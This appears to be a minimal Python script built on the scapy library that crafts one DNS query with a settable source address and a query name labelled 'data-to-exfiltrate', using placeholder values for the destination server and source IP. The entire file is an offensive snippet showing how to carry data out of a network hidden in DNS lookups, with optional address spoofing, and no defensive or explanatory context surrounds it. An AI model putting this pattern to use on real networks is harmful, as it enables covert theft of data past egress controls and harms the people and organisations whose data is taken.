#!/usr/bin/env python
from scapy.all import *

sr1(IP(dst="dns",src="ip")/UDP()/DNS(rd=1,qd=DNSQR(qname="data-to-exfiltrate")))
